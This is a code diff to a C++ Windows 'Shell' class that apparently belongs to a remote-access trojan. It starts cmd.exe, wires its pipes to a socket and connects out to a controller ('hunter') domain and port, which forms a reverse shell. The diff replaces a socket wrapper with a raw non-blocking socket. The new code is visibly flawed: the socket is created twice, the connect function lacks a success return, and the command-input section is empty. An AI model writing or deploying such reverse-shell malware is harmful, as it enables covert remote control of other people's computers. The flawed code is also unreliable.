@@ -5,7 +5,7 @@
 #define RESULT_SIZE 2048
 
 static Shell gShell; // 初始化类
-static TcpSocket gSock; // 传递数据的套接字
+static SOCKET gSocket = SOCKET_ERROR; // 创建原始套接字 因为要使用一个异步的套接字
 // 四个HANDLE 用来创建两个管道
 static HANDLE ghReadPipe1, ghWritePipe1, ghReadPipe2, ghWritePipe2;
 // 创建命令行进程之后拿到的pi 控制cmd进程
@@ -16,24 +16,25 @@ static CHAR szSend[SEND_SIZE] = { 0 };
 static CHAR szResult[RESULT_SIZE] = { 0 };
 
 void Shell::startShell(std::string domain, int port) {
-	// 新建连接到hunter端的socket连接
-	if (!gSock.connectTo(domain, port)) {
-		gSock.dissconnect();
-		OutputDebugStringA("Failed to connect hunter for keybd\r\n");
-		return;
+	// 设置并连接好非阻塞套接字
+	if (!setAsySocket(domain, port)) {
+		OutputDebugStringA("set asy socket failed\r\n");
 	}
+
 	// 启动子进程
 	// 此时socket都已准备好
 	if (!createCmd()) {
 		OutputDebugStringA("create cmd exe failed\r\n");
-		gSock.dissconnect();
+		closesocket(gSocket);
+		gSocket = SOCKET_ERROR;
 		return;
 	}
 	// 创建沟通cmd和socket的线程函数
 	HANDLE h = CreateThread(NULL, 0, Shell::threadProc, (LPVOID)NULL, 0, NULL);
 	if (!h) {
 		OutputDebugStringA("Failed to create new thread\r\n");
-		gSock.dissconnect();
+		closesocket(gSocket);
+		gSocket = SOCKET_ERROR;
 		return;
 	}
 	OutputDebugStringA("start shell successfully\r\n");
@@ -102,13 +103,57 @@ DWORD Shell::threadProc(LPVOID args) {
 			}
 		}
 
+		// -------------------------------接收套接字数据部分（命令输入）----------------------------
 	}
-	
+
 	// 一旦发生错误就处理后事
 	CloseHandle(ghReadPipe1);
 	CloseHandle(ghReadPipe2);
 	CloseHandle(ghWritePipe1);
 	CloseHandle(ghWritePipe2);
-	gSock.dissconnect();
+	closesocket(gSocket);
+	gSocket = SOCKET_ERROR;
 	return 1;
 }
+
+// 设置非阻塞套接字
+bool Shell::setAsySocket(std::string domain, int port) {
+	unsigned long ul = 1;
+	int ret;
+	gSocket = socket(AF_INET, SOCK_STREAM, 0);
+	// 设置为非阻塞套接字
+	if (SOCKET_ERROR == ioctlsocket(gSocket, FIONBIO, (unsigned long*)&ul)) {
+		OutputDebugStringA("set asy socket failed\r\n");
+		return false;
+	}
+	// 连接工作
+	std::string ip = TcpSocket::fromDomainToIP(domain);
+
+	// 创建套接字 0表示先不指定协议
+	if ((int)(gSocket = socket(AF_INET, SOCK_STREAM, 0)) == SOCKET_ERROR) {
+		OutputDebugStringA("Failed to create socket ");
+		OutputDebugStringA(ip.data());
+		OutputDebugStringA("\r\n");
+
+		closesocket(gSocket);
+		gSocket = SOCKET_ERROR;
+		return false;
+	}
+	struct sockaddr_in addr;
+	// 设置地址和端口
+	addr.sin_family = AF_INET;
+	addr.sin_addr.S_un.S_addr = inet_addr(ip.data());
+	addr.sin_port = htons(port);
+
+	// 连接
+	if (connect(gSocket, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) {
+		OutputDebugStringA("Failed to connect to ");
+		OutputDebugStringA(ip.data());
+		OutputDebugStringA("\r\n");
+
+		closesocket(gSocket);
+		gSocket = SOCKET_ERROR;
+		return false;
+	}
+}
+
